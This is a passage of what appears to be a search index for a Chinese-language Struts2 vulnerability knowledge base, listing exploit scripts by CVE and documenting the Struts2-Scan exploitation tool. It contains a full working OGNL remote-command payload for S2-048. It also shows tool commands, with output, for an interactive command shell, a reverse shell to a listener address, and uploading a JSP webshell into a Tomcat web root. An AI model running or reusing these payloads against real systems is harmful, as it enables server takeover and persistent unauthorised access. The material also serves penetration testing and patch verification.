\u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c1(CVE-2017-5638) [\u4f7f\u7528] struts2-045-2_cmd.py Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c2(CVE-2017-5638) [\u4f7f\u7528] struts2-052_cmd.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-9805) struts2-052_webshell.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c(CVE-2017-9805) struts2-053_cmd.py Struts2 Freemarker \u6807\u7b7e\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-12611) struts2-057_cmd.py Struts2 Namespace \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2018-11776)","title":"Vulnerability list"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/readme/#readme","text":"\u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003 vulnerability-list \u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: \u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0","title":"Readme"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/","text":"S2-048(CVE-2017-9791) \u00b6 Affected Version \u00b6 Struts 2.3.x \u6b64\u5916\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6\uff1a \u8c03\u7528\u975e\u9ed8\u8ba4\u63d2\u4ef6 struts2-struts1-plugin.jar \u4ee3\u7801\u4e2d\u521b\u5efa ActionMessage \u5bf9\u8c61\u4f7f\u7528 \u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u5f62\u5f0f\uff0c\u5982\u4e0b\uff1a messages.add(\"msg\", new ActionMessage(\"Gangster \" + gform.getName() + \" was added\")); poc \u00b6 \u6f0f\u6d1e\u73af\u5883\u4f7f\u7528 Struts-2.3.32 \u7248\u672c \u7684 showcase \u5e94\u7528 Py \u811a\u672c\u9a8c\u8bc1 (poc.py) Forefox Hackbar \u9a8c\u8bc1\uff1a POST \u6570\u636e\u5305\uff1a age=1&cmd=echo Affected by S2-048&__checkbox_bustedBefore=true&name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%23parameters.cmd%5B0%5D%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&description=test \u7ed3\u679c\uff1a References \u00b6 https://cwiki.apache.org/confluence/display/WW/S2-048 https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-048","title":"S2-048(CVE-2017-9791)"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/#s2-048cve-2017-9791","text":"","title":"S2-048(CVE-2017-9791)"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/#affected-version","text":"Struts 2.3.x \u6b64\u5916\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6\uff1a \u8c03\u7528\u975e\u9ed8\u8ba4\u63d2\u4ef6 struts2-struts1-plugin.jar \u4ee3\u7801\u4e2d\u521b\u5efa ActionMessage \u5bf9\u8c61\u4f7f\u7528 \u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u5f62\u5f0f\uff0c\u5982\u4e0b\uff1a messages.add(\"msg\", new ActionMessage(\"Gangster \" + gform.getName() + \" was added\"));","title":"Affected Version"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/#poc","text":"\u6f0f\u6d1e\u73af\u5883\u4f7f\u7528 Struts-2.3.32 \u7248\u672c \u7684 showcase \u5e94\u7528 Py \u811a\u672c\u9a8c\u8bc1 (poc.py) Forefox Hackbar \u9a8c\u8bc1\uff1a POST \u6570\u636e\u5305\uff1a age=1&cmd=echo Affected by S2-048&__checkbox_bustedBefore=true&name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%23parameters.cmd%5B0%5D%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&description=test \u7ed3\u679c\uff1a","title":"poc"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/#references","text":"https://cwiki.apache.org/confluence/display/WW/S2-048 https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-048","title":"References"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/","text":"Struts2-Scan \u00b6 Struts2\u6f0f\u6d1e\u5229\u7528\u626b\u63cf\u5de5\u5177\uff0c\u57fa\u4e8e\u4e92\u8054\u7f51\u4e0a\u5df2\u7ecf\u516c\u5f00\u7684Structs2\u9ad8\u5371\u6f0f\u6d1eexp\u7684\u626b\u63cf\u5229\u7528\u5de5\u5177\uff0c\u76ee\u524d\u652f\u6301\u7684\u6f0f\u6d1e\u5982\u4e0b: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 \u652f\u6301\u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b\u548c\u6279\u91cfURL\u68c0\u6d4b\uff0c\u81f3\u6b64\u6307\u5b9a\u6f0f\u6d1e\u5229\u7528\uff0c\u53ef\u83b7\u53d6WEB\u8def\u5f84\uff0c\u6267\u884c\u547d\u4ee4\uff0c\u53cd\u5f39shell\u548c\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u6f0f\u6d1e\u5747\u652f\u6301\u4e0a\u8ff0\u529f\u80fd\uff0c\u53ea\u6709\u90e8\u5206\u529f\u80fd\u652f\u6301 \u5982\u6709\u9519\u8bef\u6216\u8005\u95ee\u9898\u6b22\u8fce\u5927\u5bb6\u63d0\u95ee\u4ea4\u6d41\uff0c\u4e00\u8d77\u89e3\u51b3 \u8fd0\u884c\u73af\u5883 \u00b6 Python3.6.X\u53ca\u5176\u4ee5\u4e0a\u7248\u672c \u7b2c\u4e09\u65b9\u5e93: click, requests, bs4 \u6d4b\u8bd5\u73af\u5883: Ubuntu 16.04 \u6f0f\u6d1e\u73af\u5883\u5df2\u4e0a\u4f20\uff0c\u53c2\u8003\u5730\u5740\uff1a https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2 \u5de5\u5177\u53c2\u6570\u8bf4\u660e \u00b6 Usage: Struts2Scan.py [OPTIONS] Struts2\u6279\u91cf\u626b\u63cf\u5229\u7528\u5de5\u5177 Options: -i, --info \u6f0f\u6d1e\u4fe1\u606f\u4ecb\u7ecd -v, --version \u663e\u793a\u5de5\u5177\u7248\u672c -u, --url TEXT URL\u5730\u5740 -n, --name TEXT \u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0, \u6f0f\u6d1e\u540d\u79f0\u8be6\u89c1info -f, --file TEXT \u6279\u91cf\u626b\u63cfURL\u6587\u4ef6, \u4e00\u884c\u4e00\u4e2aURL -d, --data TEXT POST\u53c2\u6570, \u9700\u8981\u4f7f\u7528\u7684payload\u4f7f\u7528{exp}\u586b\u5145, \u5982: name=test&passwd={exp} -c, --encode TEXT \u9875\u9762\u7f16\u7801, \u9ed8\u8ba4UTF-8\u7f16\u7801 -p, --proxy TEXT HTTP\u4ee3\u7406. \u683c\u5f0f\u4e3ahttp://ip:port -t, --timeout TEXT HTTP\u8d85\u65f6\u65f6\u95f4, \u9ed8\u8ba410s -w, --workers TEXT \u6279\u91cf\u626b\u63cf\u8fdb\u7a0b\u6570, \u9ed8\u8ba4\u4e3a10\u4e2a\u8fdb\u7a0b --header TEXT HTTP\u8bf7\u6c42\u5934, \u683c\u5f0f\u4e3a: key1=value1&key2=value2 -e, --exec \u8fdb\u5165\u547d\u4ee4\u6267\u884cshell --webpath \u83b7\u53d6WEB\u8def\u5f84 -r, --reverse TEXT \u53cd\u5f39shell\u5730\u5740, \u683c\u5f0f\u4e3aip:port --upfile TEXT \u9700\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u8def\u5f84\u548c\u540d\u79f0 --uppath TEXT \u4e0a\u4f20\u7684\u76ee\u5f55\u548c\u540d\u79f0, \u5982: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet \u5173\u95ed\u6253\u5370\u4e0d\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa\uff0c\u53ea\u4fdd\u7559\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa -h, --help Show this message and exit. \u4f7f\u7528\u4f8b\u5b50 \u00b6 \u67e5\u770b\u6f0f\u6d1e\u8be6\u7ec6\u4fe1\u606f: \u00b6 $ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u652f\u6301\u5982\u4e0bStruts2\u6f0f\u6d1e: [+] S2-001:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.8; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-003:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.11.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c [+] S2-005:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.1.8.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c [+] S2-007:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.2.3; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-008:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-009:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.1.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,URL\u540e\u9762\u9700\u8981\u8bf7\u6c42\u53c2\u6570\u540d; \u9ed8\u8ba4\u4e3a: key; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-012:\u5f71\u54cd\u7248\u672cStruts Showcase App 2.0.0-2.3.13; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u53c2\u6570\u76f4\u63a5\u6dfb\u52a0\u5230URL\u540e\u9762; \u9ed8\u8ba4\u4e3a:name; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-013/S2-014:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-015:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-016:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-019:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-029:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.24.1(\u9664\u4e862.3.20.3); POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u9700\u8981\u53c2\u6570; \u9ed8\u8ba4\u53c2\u6570:message; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-032:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-033:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-037:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-045:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-046:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-048:\u5f71\u54cd\u7248\u672cStruts 2.3.x with Struts 1 plugin and Struts 1 action; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-053:\u5f71\u54cd\u7248\u672cStruts 2.0.1-2.3.33,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-devMode:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell \u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b: \u00b6 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u6b63\u5728\u626b\u63cfURL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-046 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-016 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-045 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-015 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-009 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-012 \u6279\u91cf\u6f0f\u6d1e\u68c0\u6d4b: \u00b6 $ python3 Struts2Scan.py -f urls.txt POST\u6570\u636e: \u00b6 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp} \u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0\u5229\u7528: \u00b6 # \u547d\u4ee4\u6267\u884c $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # \u53cd\u5f39shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] \u8bf7\u5728\u53cd\u5f39\u5730\u5740\u5904\u76d1\u542c\u7aef\u53e3\u5982: nc -lvvp 8080 # \u83b7\u53d6WEB\u8def\u5f84 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # \u4e0a\u4f20shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u6587\u4ef6\u4e0a\u4f20\u6210\u529f!","title":"Struts2-Scan"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#struts2-scan","text":"Struts2\u6f0f\u6d1e\u5229\u7528\u626b\u63cf\u5de5\u5177\uff0c\u57fa\u4e8e\u4e92\u8054\u7f51\u4e0a\u5df2\u7ecf\u516c\u5f00\u7684Structs2\u9ad8\u5371\u6f0f\u6d1eexp\u7684\u626b\u63cf\u5229\u7528\u5de5\u5177\uff0c\u76ee\u524d\u652f\u6301\u7684\u6f0f\u6d1e\u5982\u4e0b: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 \u652f\u6301\u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b\u548c\u6279\u91cfURL\u68c0\u6d4b\uff0c\u81f3\u6b64\u6307\u5b9a\u6f0f\u6d1e\u5229\u7528\uff0c\u53ef\u83b7\u53d6WEB\u8def\u5f84\uff0c\u6267\u884c\u547d\u4ee4\uff0c\u53cd\u5f39shell\u548c\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u6f0f\u6d1e\u5747\u652f\u6301\u4e0a\u8ff0\u529f\u80fd\uff0c\u53ea\u6709\u90e8\u5206\u529f\u80fd\u652f\u6301 \u5982\u6709\u9519\u8bef\u6216\u8005\u95ee\u9898\u6b22\u8fce\u5927\u5bb6\u63d0\u95ee\u4ea4\u6d41\uff0c\u4e00\u8d77\u89e3\u51b3","title":"Struts2-Scan"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_1","text":"Python3.6.X\u53ca\u5176\u4ee5\u4e0a\u7248\u672c \u7b2c\u4e09\u65b9\u5e93: click, requests, bs4 \u6d4b\u8bd5\u73af\u5883: Ubuntu 16.04 \u6f0f\u6d1e\u73af\u5883\u5df2\u4e0a\u4f20\uff0c\u53c2\u8003\u5730\u5740\uff1a https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2","title":"\u8fd0\u884c\u73af\u5883"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_2","text":"Usage: Struts2Scan.py [OPTIONS] Struts2\u6279\u91cf\u626b\u63cf\u5229\u7528\u5de5\u5177 Options: -i, --info \u6f0f\u6d1e\u4fe1\u606f\u4ecb\u7ecd -v, --version \u663e\u793a\u5de5\u5177\u7248\u672c -u, --url TEXT URL\u5730\u5740 -n, --name TEXT \u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0, \u6f0f\u6d1e\u540d\u79f0\u8be6\u89c1info -f, --file TEXT \u6279\u91cf\u626b\u63cfURL\u6587\u4ef6, \u4e00\u884c\u4e00\u4e2aURL -d, --data TEXT POST\u53c2\u6570, \u9700\u8981\u4f7f\u7528\u7684payload\u4f7f\u7528{exp}\u586b\u5145, \u5982: name=test&passwd={exp} -c, --encode TEXT \u9875\u9762\u7f16\u7801, \u9ed8\u8ba4UTF-8\u7f16\u7801 -p, --proxy TEXT HTTP\u4ee3\u7406. \u683c\u5f0f\u4e3ahttp://ip:port -t, --timeout TEXT HTTP\u8d85\u65f6\u65f6\u95f4, \u9ed8\u8ba410s -w, --workers TEXT \u6279\u91cf\u626b\u63cf\u8fdb\u7a0b\u6570, \u9ed8\u8ba4\u4e3a10\u4e2a\u8fdb\u7a0b --header TEXT HTTP\u8bf7\u6c42\u5934, \u683c\u5f0f\u4e3a: key1=value1&key2=value2 -e, --exec \u8fdb\u5165\u547d\u4ee4\u6267\u884cshell --webpath \u83b7\u53d6WEB\u8def\u5f84 -r, --reverse TEXT \u53cd\u5f39shell\u5730\u5740, \u683c\u5f0f\u4e3aip:port --upfile TEXT \u9700\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u8def\u5f84\u548c\u540d\u79f0 --uppath TEXT \u4e0a\u4f20\u7684\u76ee\u5f55\u548c\u540d\u79f0, \u5982: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet \u5173\u95ed\u6253\u5370\u4e0d\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa\uff0c\u53ea\u4fdd\u7559\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa -h, --help Show this message and 